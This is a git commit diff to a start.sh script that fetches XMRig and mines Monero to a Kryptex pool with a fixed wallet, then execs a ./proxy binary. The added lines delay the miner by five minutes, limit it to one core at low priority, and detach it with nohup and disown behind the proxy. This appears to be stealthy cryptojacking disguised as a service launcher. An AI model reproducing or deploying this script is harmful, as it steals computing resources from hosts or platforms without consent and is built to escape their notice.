e3e00c1156d545a2d468ee46d39565fc7880ba8a
Wers <112427364+w9line@users.noreply.github.com>
2026-04-02 09:00:28 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -8,5 +8,39 @@ ARCHIVE=$DIR-linux-static-x64.tar.gz
 [ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)
 
 WALLET="krxX3328ZR/z_render_all"
-sh -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero--randomx-mode=light --cpu-max-threads-hint=1 --no-msr --asm=none; sleep 60; done" 
 
+# Функция мониторинга памяти
+monitor_mem() {
+    while true; do
+        echo "=== $(date) ===" >> mem.log
+        free -m >> mem.log
+        ps aux | grep xmrig | grep -v grep >> mem.log
+        sleep 30
+    done
+}
+monitor_mem &
+
+# Ждём перед запуском майнера
+sleep 300
+
+# Запуск с минимальными настройками
+nohup bash -c "
+    while true; do
+        echo 'Starting xmrig...' >> xmrig.log
+        taskset -c 0 ./$DIR/xmrig \
+            --url=xmr-ru.kryptex.network:7029 \
+            --user=$WALLET \
+            --pass=x \
+            --coin=monero \
+            --randomx-mode=light \
+            --asm=none \
+            --cpu-max-threads-hint=1 \
+            --cpu-priority=0 \
+            2>&1 | tee -a xmrig.log
+        echo 'XMRig crashed/restarted, waiting 60s...' >> xmrig.log
+        sleep 60
+    done
+" &
+
+disown
+exec ./proxy
